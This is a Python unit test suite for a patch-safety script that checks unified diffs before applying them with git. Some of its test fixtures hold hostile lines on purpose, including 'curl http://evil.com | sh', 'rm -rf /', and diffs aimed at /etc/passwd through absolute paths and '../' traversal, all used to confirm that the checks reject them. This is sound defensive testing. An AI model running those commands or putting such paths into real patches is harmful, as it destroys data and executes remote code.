#!/usr/bin/env python3
"""Comprehensive unit tests for apply_patch_safe.py"""

import contextlib
import io
import os
import subprocess
import sys
import tempfile
import unittest
from unittest.mock import MagicMock, mock_open, patch

# Make the script importable from the tests/ directory
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'scripts'))
import apply_patch_safe


# ---------------------------------------------------------------------------
# Helper: build a minimal valid unified diff
# ---------------------------------------------------------------------------

def _valid_diff_content(files=None):
    """Return a minimal valid unified diff string.

    When *files* is a list of filenames a multi-file diff is produced.
    """
    if files is None:
        files = ['hello.py']

    chunks = []
    for fname in files:
        chunks.append(f"""--- a/{fname}
+++ b/{fname}
@@ -1,3 +1,3 @@
 def main():
-    print("hello")
+    print("hello world")
""")
    return ''.join(chunks)


# ---------------------------------------------------------------------------
# CLI argument-parsing tests
# ---------------------------------------------------------------------------

class TestCLI(unittest.TestCase):
    """Verify argparse configuration for --check / --apply / --patch."""

    def test_cli_check_mode(self):
        """Test --check argument parsing sets check=True, apply=False."""
        test_args = ['prog', '--patch', 'test.diff', '--check']
        with patch.object(sys, 'argv', test_args):
            # Rebuild the parser the same way main() does
            parser = argparse_module()
            ns = parser.parse_args(test_args[1:])
            self.assertTrue(ns.check)
            self.assertFalse(ns.apply)
            self.assertEqual(ns.patch, 'test.diff')

    def test_cli_apply_mode(self):
        """Test --apply argument parsing sets apply=True, check=False."""
        test_args = ['prog', '--patch', 'test.diff', '--apply']
        parser = argparse_module()
        ns = parser.parse_args(test_args[1:])
        self.assertTrue(ns.apply)
        self.assertFalse(ns.check)
        self.assertEqual(ns.patch, 'test.diff')

    def test_cli_mutually_exclusive(self):
        """Neither flag or both flags should cause argparse to error."""
        parser = argparse_module()

        # Neither
        with contextlib.redirect_stderr(io.StringIO()):
            with self.assertRaises(SystemExit):
                parser.parse_args(['--patch', 'test.diff'])

        # Both
        with contextlib.redirect_stderr(io.StringIO()):
            with self.assertRaises(SystemExit):
                parser.parse_args(
                    ['--patch', 'test.diff', '--check', '--apply']
                )

    def test_cli_patch_required(self):
        """--patch is a required argument."""
        parser = argparse_module()
        with contextlib.redirect_stderr(io.StringIO()):
            with self.assertRaises(SystemExit):
                parser.parse_args(['--check'])


# ---------------------------------------------------------------------------
# Safety-check function tests (call functions directly with string content)
# ---------------------------------------------------------------------------

class TestSafetyChecks(unittest.TestCase):
    """Unit tests for each individual safety-check function."""

    # -- check_empty -------------------------------------------------------

    def test_empty_patch_rejected(self):
        ok, msg = apply_patch_safe.check_empty("")
        self.assertFalse(ok)
        self.assertIn("empty", msg.lower())

    def test_whitespace_patch_rejected(self):
        ok, msg = apply_patch_safe.check_empty("   \n \t \n  ")
        self.assertFalse(ok)
        self.assertIn("empty", msg.lower())

    def test_nonempty_patch_accepted(self):
        ok, msg = apply_patch_safe.check_empty(_valid_diff_content())
        self.assertTrue(ok)

    # -- check_absolute_paths ----------------------------------------------

    def test_absolute_path_rejected(self):
        diff = """--- a//etc/passwd
+++ b//etc/passwd
@@ -1,1 +1,1 @@
-hack
+hacked
"""
        ok, msg = apply_patch_safe.check_absolute_paths(diff)
        self.assertFalse(ok)
        self.assertIn("Absolute path", msg)

    def test_absolute_path_no_prefix_rejected(self):
        """Absolute paths without a/ or b/ prefix must be caught."""
        diff = """--- /tmp/evil.txt
+++ /tmp/evil.txt
@@ -0,0 +1 @@
+evil
"""
        ok, msg = apply_patch_safe.check_absolute_paths(diff)
        self.assertFalse(ok)
        self.assertIn("Absolute path", msg)
        self.assertIn("/tmp/evil.txt", msg)

    def test_relative_paths_accepted(self):
        ok, msg = apply_patch_safe.check_absolute_paths(
            _valid_diff_content()
        )
        self.assertTrue(ok)

    # -- check_no_files_referenced -----------------------------------------

    def test_no_files_referenced_rejected(self):
        """Patch with no real file paths should be rejected."""
        # A diff where all headers reference /dev/null only
        diff = """--- /dev/null
+++ /dev/null
@@ -0,0 +0,0 @@
"""
        ok, msg = apply_patch_safe.check_no_files_referenced(diff)
        self.assertFalse(ok)
        self.assertIn("does not reference any files", msg)

    def test_files_referenced_accepted(self):
        ok, msg = apply_patch_safe.check_no_files_referenced(
            _valid_diff_content()
        )
        self.assertTrue(ok)

    # -- check_path_traversal ----------------------------------------------

    def test_path_traversal_rejected(self):
        diff = """--- a/../etc/passwd
+++ b/../etc/passwd
@@ -1,1 +1,1 @@
-x
+y
"""
        ok, msg = apply_patch_safe.check_path_traversal(diff)
        self.assertFalse(ok)
        self.assertIn("Path traversal", msg)

    def test_deep_traversal_rejected(self):
        diff = """--- a/foo/../../bar
+++ b/foo/../../bar
@@ -1,1 +1,1 @@
-x
+y
"""
        ok, msg = apply_patch_safe.check_path_traversal(diff)
        self.assertFalse(ok)
        self.assertIn("Path traversal", msg)

    def test_no_traversal_accepted(self):
        ok, msg = apply_patch_safe.check_path_traversal(
            _valid_diff_content()
        )
        self.assertTrue(ok)

    # -- check_git_dir -----------------------------------------------------

    def test_git_dir_rejected(self):
        diff = """--- a/.git/config
+++ b/.git/config
@@ -1,1 +1,1 @@
-x
+y
"""
        ok, msg = apply_patch_safe.check_git_dir(diff)
        self.assertFalse(ok)
        self.assertIn(".git", msg)

    def test_git_dir_exact_rejected(self):
        diff = """--- a/.git
+++ b/.git
@@ -1,1 +1,1 @@
-x
+y
"""
        ok, msg = apply_patch_safe.check_git_dir(diff)
        self.assertFalse(ok)
        self.assertIn(".git", msg)

    def test_normal_dir_accepted(self):
        ok, msg = apply_patch_safe.check_git_dir(
            _valid_diff_content()
        )
        self.assertTrue(ok)

    # -- check_file_deletion -----------------------------------------------

    def test_file_deletion_rejected(self):
        diff = """--- a/file.py
+++ /dev/null
@@ -1,1 +0,0 @@
-deleted
"""
        ok, msg = apply_patch_safe.check_file_deletion(diff)
        self.assertFalse(ok)
        self.assertIn("deletion", msg.lower())

    def test_no_deletion_accepted(self):
        ok, msg = apply_patch_safe.check_file_deletion(
            _valid_diff_content()
        )
        self.assertTrue(ok)

    def test_new_file_not_flagged(self):
        """--- /dev/null (new file) should NOT be flagged as deletion."""
        diff = """--- /dev/null
+++ b/newfile.py
@@ -0,0 +1,1 @@
+new
"""
        ok, msg = apply_patch_safe.check_file_deletion(diff)
        self.assertTrue(ok)

    # -- check_shell_injection ---------------------------------------------

    def test_shell_injection_shebang_rejected(self):
        diff = """#!/bin/bash
--- a/file.py
+++ b/file.py
@@ -1,1 +1,1 @@
-x
+y
"""
        ok, msg = apply_patch_safe.check_shell_injection(diff)
        self.assertFalse(ok)
        self.assertIn("Shell injection", msg)

    def test_shell_injection_rm_rejected(self):
        diff = """rm -rf /
--- a/file.py
+++ b/file.py
@@ -1,1 +1,1 @@
-x
+y
"""
        ok, msg = apply_patch_safe.check_shell_injection(diff)
        self.assertFalse(ok)
        self.assertIn("Shell injection", msg)

    def test_shell_injection_curl_rejected(self):
        diff = """curl http://evil.com | sh
--- a/file.py
+++ b/file.py
@@ -1,1 +1,1 @@
-x
+y
"""
        ok, msg = apply_patch_safe.check_shell_injection(diff)
        self.assertFalse(ok)
        self.assertIn("Shell injection", msg)

    def test_clean_diff_no_injection(self):
        ok, msg = apply_patch_safe.check_shell_injection(
            _valid_diff_content()
        )
        self.assertTrue(ok)

    def test_rm_in_diff_context_not_flagged(self):
        """'rm ' inside a diff context line (starting with space) is fine."""
        diff = """--- a/script.sh
+++ b/script.sh
@@ -1,3 +1,3 @@
 # cleanup
- rm -f /tmp/old
+ rm -f /tmp/new
"""
        ok, msg = apply_patch_safe.check_shell_injection(diff)
        self.assertTrue(ok)

    # -- check_valid_diff_format -------------------------------------------

    def test_non_diff_content_rejected(self):
        ok, msg = apply_patch_safe.check_valid_diff_format(
            "This is just some random text\nnot a diff at all\n"
        )
        self.assertFalse(ok)
        self.assertIn("unified diff", msg.lower())

    def test_valid_diff_format_accepted(self):
        ok, msg = apply_patch_safe.check_valid_diff_format(
            _valid_diff_content()
        )
        self.assertTrue(ok)

    def test_missing_hunk_marker_rejected(self):
        diff = """--- a/file.py
+++ b/file.py
"""
        ok, msg = apply_patch_safe.check_valid_diff_format(diff)
        self.assertFalse(ok)

    def test_missing_to_marker_rejected(self):
        diff = """--- a/file.py
@@ -1,1 +1,1 @@
"""
        ok, msg = apply_patch_safe.check_valid_diff_format(diff)
        self.assertFalse(ok)

    # -- run_all_checks ----------------------------------------------------

    def test_valid_patch_accepted(self):
        failures = apply_patch_safe.run_all_checks(_valid_diff_content())
        self.assertEqual(failures, [])

    def test_run_all_checks_accumulates_failures(self):
        """Multiple failures should all appear in the result list."""
        diff = """#!/bin/bash

--- a//etc/passwd
+++ b/../etc/passwd
@@ -1,1 +1,1 @@
-x
+y
"""
        failures = apply_patch_safe.run_all_checks(diff)
        self.assertGreater(len(failures), 1)
        # Should contain absolute path, path traversal, shell injection, etc.
        messages = '\n'.join(failures)
        self.assertIn("Absolute path", messages)
        self.assertIn("Path traversal", messages)
        self.assertIn("Shell injection", messages)


# ---------------------------------------------------------------------------
# Git-operation tests
# ---------------------------------------------------------------------------

class TestGitOperations(unittest.TestCase):
    """Unit tests for git-apply wrappers (mocked subprocess)."""

    def _valid_diff(self):
        return _valid_diff_content()

    # -- git_apply_check ---------------------------------------------------

    def test_git_apply_check_called(self):
        """Verify subprocess.run is invoked with git apply --check."""
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stderr = ''

        with patch('apply_patch_safe.subprocess.run',
                   return_value=mock_result) as mock_run:
            ok, msg = apply_patch_safe.git_apply_check(self._valid_diff())
            self.assertTrue(ok)
            mock_run.assert_called_once()
            call_args = mock_run.call_args[0][0]
            self.assertEqual(call_args, ['git', 'apply', '--check'])
            # stdin should be the patch content
            self.assertIn('input', mock_run.call_args[1])

    def test_git_apply_check_failure(self):
        """git apply --check returning non-zero should produce an error."""
        mock_result = MagicMock()
        mock_result.returncode = 1
        mock_result.stderr = 'error: patch does not apply'

        with patch('apply_patch_safe.subprocess.run',
                   return_value=mock_result):
            ok, msg = apply_patch_safe.git_apply_check(self._valid_diff())
            self.assertFalse(ok)
            self.assertIn('patch does not apply', msg)

    # -- git_apply ---------------------------------------------------------

    def test_git_apply_called(self):
        """Verify subprocess.run is invoked with git apply."""
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stderr = ''

        with patch('apply_patch_safe.subprocess.run',
                   return_value=mock_result) as mock_run:
            ok, msg = apply_patch_safe.git_apply(self._valid_diff())
            self.assertTrue(ok)
            mock_run.assert_called_once()
            call_args = mock_run.call_args[0][0]
            self.assertEqual(call_args, ['git', 'apply'])
            self.assertIn('input', mock_run.call_args[1])

    def test_git_apply_failure(self):
        """git apply returning non-zero should produce an error."""
        mock_result = MagicMock()
        mock_result.returncode = 1
        mock_result.stderr = 'error: corrupt patch'

        with patch('apply_patch_safe.subprocess.run',
                   return_value=mock_result):
            ok, msg = apply_patch_safe.git_apply(self._valid_diff())
            self.assertFalse(ok)
            self.assertIn('corrupt patch', msg)


# ---------------------------------------------------------------------------
# Path extraction tests
# ---------------------------------------------------------------------------

class TestPathExtraction(unittest.TestCase):
    """Tests for extract_file_paths()."""

    def test_file_path_extraction_single(self):
        paths = apply_patch_safe.extract_file_paths(
            _valid_diff_content(['hello.py'])
        )
        self.assertEqual(paths, ['hello.py'])

    def test_file_path_extraction_no_prefix_files(self):
        """Paths without a/ or b/ prefix are now extracted."""
        diff = """--- file.py
+++ file.py
@@ -1,1 +1,1 @@
-old
+new
"""
        paths = apply_patch_safe.extract_file_paths(diff)
        # Broader regex now extracts paths even without a/ or b/ prefix
        self.assertEqual(paths, ['file.py'])

    def test_multiple_files(self):
        paths = apply_patch_safe.extract_file_paths(
            _valid_diff_content(['file1.py', 'sub/file2.py', 'file3.py'])
        )
        self.assertEqual(sorted(paths),
                         ['file1.py', 'file3.py', 'sub/file2.py'])

    def test_devnull_not_extracted(self):
        """Paths referencing /dev/null are not captured.

        ``--- /dev/null`` and ``+++ /dev/null`` headers do not use the
        ``a/`` / ``b/`` prefix, so they are never returned.  However, a
        header like ``--- a/oldfile.py`` is still captured regardless of
        whether the file is being deleted.
        """
        diff = """--- /dev/null
+++ b/newfile.py
@@ -0,0 +1,1 @@
+new
--- a/oldfile.py
+++ /dev/null
@@ -1,1 +0,0 @@
-old
"""
        paths = apply_patch_safe.extract_file_paths(diff)
        # /dev/null headers are skipped; oldfile.py is extracted from
        # the --- a/ header even though the file is marked for deletion.
        self.assertEqual(paths, ['newfile.py', 'oldfile.py'])

    def test_mixed_prefix_paths(self):
        """Mixed a/ and non-prefix paths in same diff are all extracted."""
        diff = """--- a/foo.py
+++ b/foo.py
@@ -1,1 +1,1 @@
-old
+new
--- bar.py
+++ bar.py
@@ -1,1 +1,1 @@
-old
+new
"""
        paths = apply_patch_safe.extract_file_paths(diff)
        self.assertEqual(sorted(paths), ['bar.py', 'foo.py'])


# ---------------------------------------------------------------------------
# Integration-style tests (main() with mocks)
# ---------------------------------------------------------------------------

class TestMainIntegration(unittest.TestCase):
    """End-to-end tests of the main() entry point with mocked dependencies."""

    def _valid_diff(self):
        return _valid_diff_content()

    # -- check mode --------------------------------------------------------

    @patch('apply_patch_safe.git_apply')
    @patch('apply_patch_safe.git_apply_check')
    @patch('apply_patch_safe.parse_patch_file')
    def test_main_check_mode_exits_zero(self, mock_parse, mock_git_check,
                                         mock_git_apply):
        mock_parse.return_value = self._valid_diff()
        mock_git_check.return_value = (True, "")

        test_args = ['prog', '--patch', 'patch.diff', '--check']
        with patch.object(sys, 'argv', test_args):
            with self.assertRaises(SystemExit) as cm:
                apply_patch_safe.main()
            self.assertEqual(cm.exception.code, 0)
            mock_git_check.assert_called_once()
            mock_git_apply.assert_not_called()

    @patch('apply_patch_safe.git_apply')
    @patch('apply_patch_safe.git_apply_check')
    @patch('apply_patch_safe.parse_patch_file')
    def test_main_apply_mode_calls_git_apply(self, mock_parse,
                                              mock_git_check, mock_git_apply):
        mock_parse.return_value = self._valid_diff()
        mock_git_check.return_value = (True, "")
        mock_git_apply.return_value = (True, "")

        test_args = ['prog', '--patch', 'patch.diff', '--apply']
        with patch.object(sys, 'argv', test_args):
            with self.assertRaises(SystemExit) as cm:
                apply_patch_safe.main()
            self.assertEqual(cm.exception.code, 0)
            mock_git_check.assert_called_once()
            mock_git_apply.assert_called_once()

    # -- safety-check failure in main ---------------------------------------

    @patch('apply_patch_safe.git_apply_check')
    @patch('apply_patch_safe.parse_patch_file')
    def test_main_rejects_empty_patch(self, mock_parse, mock_git_check):
        mock_parse.return_value = ""

        test_args = ['prog', '--patch', 'patch.diff', '--check']
        with patch.object(sys, 'argv', test_args):
            with self.assertRaises(SystemExit) as cm:
                apply_patch_safe.main()
            self.assertEqual(cm.exception.code, 1)
            mock_git_check.assert_not_called()

    # -- git apply --check failure in main ---------------------------------

    @patch('apply_patch_safe.git_apply')
    @patch('apply_patch_safe.git_apply_check')
    @patch('apply_patch_safe.parse_patch_file')
    def test_main_git_check_failure_exits_one(self, mock_parse,
                                               mock_git_check, mock_git_apply):
        mock_parse.return_value = self._valid_diff()
        mock_git_check.return_value = (False, "error: corrupt patch data")

        test_args = ['prog', '--patch', 'patch.diff', '--check']
        with patch.object(sys, 'argv', test_args):
            with self.assertRaises(SystemExit) as cm:
                apply_patch_safe.main()
            self.assertEqual(cm.exception.code, 1)
            mock_git_apply.assert_not_called()

    # -- git apply failure in main (apply mode) ----------------------------

    @patch('apply_patch_safe.git_apply')
    @patch('apply_patch_safe.git_apply_check')
    @patch('apply_patch_safe.parse_patch_file')
    def test_main_git_apply_failure_exits_one(self, mock_parse,
                                               mock_git_check, mock_git_apply):
        mock_parse.return_value = self._valid_diff()
        mock_git_check.return_value = (True, "")
        mock_git_apply.return_value = (False, "error: patch failed")

        test_args = ['prog', '--patch', 'patch.diff', '--apply']
        with patch.object(sys, 'argv', test_args):
            with self.assertRaises(SystemExit) as cm:
                apply_patch_safe.main()
            self.assertEqual(cm.exception.code, 1)
            mock_git_check.assert_called_once()
            mock_git_apply.assert_called_once()

    # -- file-not-found ----------------------------------------------------

    @patch('apply_patch_safe.parse_patch_file',
           side_effect=OSError("No such file"))
    def test_main_file_not_found_exits_one(self, mock_parse):
        test_args = ['prog', '--patch', 'nonexistent.diff', '--check']
        with patch.object(sys, 'argv', test_args):
            with self.assertRaises(SystemExit) as cm:
                apply_patch_safe.main()
            self.assertEqual(cm.exception.code, 1)

    # -- hunk / file counting in APPLIED message (capture stdout) ----------

    @patch('apply_patch_safe.git_apply')
    @patch('apply_patch_safe.git_apply_check')
    @patch('apply_patch_safe.parse_patch_file')
    def test_main_apply_reports_hunks_and_files(self, mock_parse,
                                                  mock_git_check, mock_git_apply):
        mock_parse.return_value = _valid_diff_content(
            ['a.py', 'b.py', 'c.py']
        )
        mock_git_check.return_value = (True, "")
        mock_git_apply.return_value = (True, "")

        test_args = ['prog', '--patch', 'patch.diff', '--apply']
        with patch.object(sys, 'argv', test_args):
            with patch('sys.stdout', new_callable=io.StringIO) as mock_stdout:
                with self.assertRaises(SystemExit) as cm:
                    apply_patch_safe.main()
                self.assertEqual(cm.exception.code, 0)
                output = mock_stdout.getvalue()
                # 3 files, 1 hunk per file = 3 hunks
                self.assertIn("3 hunks, 3 files", output)
                self.assertIn("APPLIED", output)

    # -- multi-hunk patch counting -----------------------------------------

    @patch('apply_patch_safe.git_apply')
    @patch('apply_patch_safe.git_apply_check')
    @patch('apply_patch_safe.parse_patch_file')
    def test_main_apply_multi_hunk_count(self, mock_parse, mock_git_check,
                                          mock_git_apply):
        diff = """--- a/app.py
+++ b/app.py
@@ -1,3 +1,3 @@
 def foo():
-    pass
+    return 1
@@ -10,3 +10,3 @@
 def bar():
-    pass
+    return 2
"""
        mock_parse.return_value = diff
        mock_git_check.return_value = (True, "")
        mock_git_apply.return_value = (True, "")

        test_args = ['prog', '--patch', 'patch.diff', '--apply']
        with patch.object(sys, 'argv', test_args):
            with patch('sys.stdout', new_callable=io.StringIO) as mock_stdout:
                with self.assertRaises(SystemExit) as cm:
                    apply_patch_safe.main()
                self.assertEqual(cm.exception.code, 0)
                output = mock_stdout.getvalue()
                self.assertIn("2 hunks, 1 files", output)


# ---------------------------------------------------------------------------
# Tempfile-based tests (the spec asks for tempfile usage)
# ---------------------------------------------------------------------------

class TestWithTempFiles(unittest.TestCase):
    """Tests that exercise real file I/O via temporary patch files."""

    def test_parse_patch_file_reads_content(self):
        content = _valid_diff_content()
        with tempfile.NamedTemporaryFile(
                mode='w', suffix='.diff', delete=False) as tmp:
            tmp.write(content)
            tmp_path = tmp.name

        try:
            result = apply_patch_safe.parse_patch_file(tmp_path)
            self.assertEqual(result, content)
        finally:
            os.unlink(tmp_path)

    def test_end_to_end_with_tempfile(self):
        """Simulate --check mode with a real temp file and mocked git."""
        content = _valid_diff_content(['foo.py', 'bar/baz.py'])
        with tempfile.NamedTemporaryFile(
                mode='w', suffix='.diff', delete=False) as tmp:
            tmp.write(content)
            tmp_path = tmp.name

        try:
            mock_result = MagicMock()
            mock_result.returncode = 0
            mock_result.stderr = ''

            test_args = ['prog', '--patch', tmp_path, '--check']
            with patch.object(sys, 'argv', test_args):
                with patch('apply_patch_safe.subprocess.run',
                           return_value=mock_result) as mock_run:
                    with patch('sys.stdout',
                               new_callable=io.StringIO) as mock_stdout:
                        with self.assertRaises(SystemExit) as cm:
                            apply_patch_safe.main()
                        self.assertEqual(cm.exception.code, 0)
                        output = mock_stdout.getvalue()
                        self.assertIn("Would apply to: bar/baz.py, foo.py",
                                      output)
                        self.assertIn("CHECK PASSED", output)
                        mock_run.assert_called_once()
        finally:
            os.unlink(tmp_path)


# ---------------------------------------------------------------------------
# argparse helper (mirrors what main() builds) for isolated parser tests
# ---------------------------------------------------------------------------

def argparse_module():
    """Return the same ArgumentParser that main() creates."""
    import argparse as _argparse
    parser = _argparse.ArgumentParser(
        description='Safely validate and apply unified diff patches.',
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument(
        '--check', action='store_true',
        help='Validate the patch only (do not apply)',
    )
    group.add_argument(
        '--apply', action='store_true',
        help='Validate and then apply the patch',
    )
    parser.add_argument(
        '--patch', required=True,
        help='Path to the unified diff patch file',
    )
    return parser


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------

if __name__ == '__main__':
    unittest.main()
